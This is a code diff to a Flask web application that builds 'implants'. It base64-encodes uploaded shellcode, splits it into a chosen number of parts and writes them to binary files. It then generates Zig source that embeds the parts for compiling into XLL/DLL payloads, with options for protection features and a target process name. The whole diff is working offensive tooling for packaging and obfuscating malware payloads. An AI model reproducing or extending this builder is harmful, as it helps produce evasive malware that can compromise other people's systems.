@@ -15,10 +15,15 @@ app = Flask(__name__,
 app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024  # this will resolve the issue with docker env to handle large POST requests. 
 app.config['IMPLANTS_DIR'] = 'implants'  # Directory to store implants
 app.config['MAX_FORM_MEMORY_SIZE'] = 32 * 1024 * 1024   # this will resolve the issue with docker env to handle large POST requests. 
+app.config['SHELLCODE_PARTS_DIR'] = '../src/shellcode_parts'  # Directory to store shellcode parts
 
 # Ensure implants directory exists
 if not os.path.exists(app.config['IMPLANTS_DIR']):
     os.makedirs(app.config['IMPLANTS_DIR'])
+
+# Ensure shellcode_parts directory exists
+if not os.path.exists(app.config['SHELLCODE_PARTS_DIR']):
+    os.makedirs(app.config['SHELLCODE_PARTS_DIR'])
 
 # Store compiled implants with metadata
 implants_registry = {}
@@ -128,6 +133,8 @@ def index():
             enable_protection = request.form.get('protection_features', 'none')
             enable_additional_options = request.form.get('enable_additional_options', 'none')
             process_name = request.form.get('process_name', '')
+            numbr_parts = int(request.form.get('num_shellcode_parts', '15'))
+
             
             xll_code = '';
             dll_code = '';
@@ -140,23 +147,48 @@ def index():
                 encoded_content = base64.b64encode(content.encode()).decode()
                 encoded_size = len(encoded_content)
                 print(f"Encoded content size: {encoded_size}")
-                shellcode_parts = split_base64_string(encoded_content)
+                shellcode_parts = split_base64_string(encoded_content, num_parts=numbr_parts)
                 
+                # Clean up old shellcode part files
+                cleanup_shellcode_parts()
+
+                # Write shellcode parts as binary files
+                part_files = []
+                for i, part in enumerate(shellcode_parts, 1):
+                    part_file = os.path.join(app.config['SHELLCODE_PARTS_DIR'], f'part{i}.bin')
+                    with open(part_file, 'wb') as f:
+                        f.write(part.encode('utf-16-le'))  # Write the base64 content as binary
+                    part_files.append(part_file)
+
                 with open('../src/main.zig', 'r') as t:
                     zig_code = t.read()
                 
                 struct_content = "//START HERE\n"
-                struct_content += "const SH = struct {\n\n"
-                struct_content += "//END HERE\n"
-      
+                struct_content += "const SH = struct {\n"
 
-                for i, part in enumerate(shellcode_parts, 1):
-                    struct_content += f'    const b{i} = ComptimeWS("{part}");\n'
-                struct_content += "\n    pub fn getshellcodeparts() [15][]const u16 {\n"
-                struct_content += "         return .{  b1,  b2,  b3,  b4,  b5,  b6,  b7,  b8,  b9,  b10,  b11,  b12,  b13,  b14,  b15, \n"
-                struct_content += "    };\n"
-                struct_content += "}\n"
+                # For each part, embed the file as bytes and then convert to u16
+                for i in range(1, numbr_parts + 1):
+                    if i <= len(part_files):
+                        # First embed the file (returns []const u8)
+                        struct_content += f'    const b{i}_bytes = @embedFile("./shellcode_parts/part{i}.bin");\n'
+                        # Then convert it to []const u16 with proper alignment handling
+                        struct_content += f'    const b{i}: []const u16 = if (b{i}_bytes.len == 0) &[_]u16{{}} else @as([*]const u16, @ptrCast(@alignCast(&b{i}_bytes[0])))[0..b{i}_bytes.len/2];\n'
+                    else:
+                        struct_content += f'    const b{i}: []const u16 = &[_]u16{{}};\n'
+
+                
+                struct_content += f"\n    pub fn getshellcodeparts() [{numbr_parts}][]const u16 {{\n"
+                struct_content += "        return .{\n"
+                for i in range(1, numbr_parts + 1, 5):  # Group by 5 for readability
+                    line_parts = []
+                    for j in range(i, min(i + 5, numbr_parts + 1)):
+                        line_parts.append(f"b{j}")
+                    struct_content += "            " + ", ".join(line_parts) + ",\n"
+
+                struct_content += "        };\n"
+                struct_content += "    }\n"
                 struct_content += "};\n"
+                struct_content += "//END HERE\n"
                 
                 
                 zig_code = re.sub(
@@ -296,7 +328,8 @@ def index():
                 except Exception as e:
                     print(f"Error during cleanup: {str(e)}")
                 
-                # Redirect to implants page
+                
+                cleanup_shellcode_parts() #clean up the shellcode parts
                 return redirect(url_for('implants_page'))
                 
             else:
@@ -356,6 +389,16 @@ def get_implants_count():
     return jsonify({
         'count': len(implants_registry)
     })
+
+# Add this function to clean up old shellcode parts
+def cleanup_shellcode_parts():
+    """Clean up old shellcode part files from previous runs"""
+    if os.path.exists(app.config['SHELLCODE_PARTS_DIR']):
+        for file in os.listdir(app.config['SHELLCODE_PARTS_DIR']):
+            try:
+                os.remove(os.path.join(app.config['SHELLCODE_PARTS_DIR'], file))
+            except Exception as e:
+                print(f"Error removing old shellcode part {file}: {str(e)}")
 
 if __name__ == '__main__':
     
